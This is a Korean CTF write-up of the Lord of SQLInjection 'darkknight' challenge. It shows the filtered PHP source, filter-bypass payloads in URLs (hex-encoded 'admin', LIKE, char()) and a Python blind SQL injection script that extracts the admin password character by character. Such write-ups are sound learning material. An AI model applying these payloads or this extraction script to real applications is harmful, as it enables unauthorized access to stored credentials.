# LOS - darknight

```php
<?php 
  include "./config.php"; 
  login_chk(); 
  $db = dbconnect(); 
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[no])) exit("No Hack ~_~"); 
  if(preg_match('/\'/i', $_GET[pw])) exit("HeHe"); 
  if(preg_match('/\'|substr|ascii|=/i', $_GET[no])) exit("HeHe"); 
  $query = "select id from prob_darkknight where id='guest' and pw='{$_GET[pw]}' and no={$_GET[no]}"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
  if($result['id']) echo "<h2>Hello {$result[id]}</h2>"; 
   
  $_GET[pw] = addslashes($_GET[pw]); 
  $query = "select pw from prob_darkknight where id='admin' and pw='{$_GET[pw]}'"; 
  $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
  if(($result['pw']) && ($result['pw'] == $_GET['pw'])) solve("darkknight"); 
  highlight_file(__FILE__); 
?>
```

매번 bypass를 할 때마다 전에 사용했더 방법을 사용할 수 없게 조건이 걸리는 듯하다. 

많은 조건이 걸려있어서 일일이 다 설명하기 어려우므로 bypass에 걸림돌이 되는 '(quote)와 새로운 조건인 ascii함수를 어떻게 우회했는지만 설명하도록 한다.

사실 '(quote)는 전에 문자열을 hex값으로 인코딩하여 우회한 적이 있다. 그 방법을 그대로 사용하였고 ascii함수를 사용할 수 없어서 고생을 많이 했는데 어쨋든 문자를 비교하여 같은지 아닌지를 판단하는 것이므로 문자열을 비교할 수 있는 새로운 함수를 찾아냈다.

새로 찾은 함수는 char라는 함수인데 아래와 같이 사용한다.

```
char(interger_expression) => character value
```

사실 ascii와 반대라고 생각하면 되는데 ascii는 문자를 받아서 숫자로 변경해주는 반면 char는숫자를 받아서 문자로 돌려준다. 지금까지 사용하던 코드를 조금만 손 보면 역시 답을 찾을 수 있을 것이다. 코드를 손보기 전에 어떤식으로 입력이 가능한지 테스트를 먼저 해보자.

```url
https://los.rubiya.kr/chall/darkknight_5cfbc71e68e09f1b039a8204d1a81456.php?no=1||true
```

일단 그냥 pw말고 no에 아무 값이나 넣어주고 or true를 걸어주어보니 

"Hello guest"

라는 문자를 만날 수 있었다. 그럼 이제 like 함수로 pw의 length를 구할 수 있는지 확인해 보자.

```url
https://los.rubiya.kr/chall/darkknight_5cfbc71e68e09f1b039a8204d1a81456.php?no=1%20||%20length(pw)%20like%208
```

지금까지 모든 pw는 8자였음으로 8을 넣어주었는데 역시 

"Hello admin"

이라는 문자를 만나면서 pw의 length는 8이 true임을 확인할 수 있었다.  그럼 이제 마지막으로 id에 'admin'이라는 문자열을 인코딩해 넣어주는 것이 역시 true로 작동하는지 확인하도록 한다.

```url
https://los.rubiya.kr/chall/darkknight_5cfbc71e68e09f1b039a8204d1a81456.php?no=1%20||%20id%20like%200x61646d696e%20%26%26%20length(pw)%20like%208
```

"Hello admin"

이라는 문자를 만났다. 이제 코드를 바꿔서 pw를 알아내보자.

```python	
import requests
cooki = {'PHPSESSID': "otscuf8q15lrb320f1jnkt8c9j"}
url = "https://los.rubiya.kr/chall/darkknight_5cfbc71e68e09f1b039a8204d1a81456.php?"
i = 1
key = "Hello admin"
pw_len = 0
while True:
    params = {'no': "1||length(pw) like "+str(i)+"#"} #pw의 길이를 구하는 부분
    res = requests.get(url, params, cookies=cooki)
    #print res.text
    if key in res.text:
        pw_len = i
        break
    i = i + 1
    print i
print pw_len
for j in range(1,pw_len+1):
    for k in range(48, 123):
        if 58 <= k < 65:
            continue
        if 91 <= k < 97:
            continue
        params = {'no': "1 || id like 0x61646d696e && (left(right(pw,"+str(j)+"),1)) like char("+str(k)+")#"} #pw를 한 글자씩 맞춰보는 부분
        res2 = requests.get(url, params, cookies=cooki)
        #
        if key in res2.text:
            print str(j) + " : " + chr(k)
```

코드에서 바뀐 부분은 parameter로 인자들을 넘겨주는 부분뿐이다. 거기서 중요한 것은 left와 right함수 앞에 있던 ascii함수가 없어져 pw에서 빼온 문자와 숫자를 문자로 바꾼 것을 비교해 체크하는 방식으로 바뀌었다는 것이다.

```
8
1 : F	1 : f
2 : 1
3 : A	3 : a
4 : E	4 : e
5 : 0
6 : 7
7 : B	7 : b
8 : 0
```

결과는 다음과 같이 나왔는데 같은 영문자는 대 소문자 모두 걸리는 것을 확인할 수 있었다. 그래서 pw는 대소문자를 구분하지 않는다고 가정하고 거꾸로 입력해 보았다.

![1565694284949](C:\Users\qkrwl\Documents\web\los\LOS - darknight-clear.png)

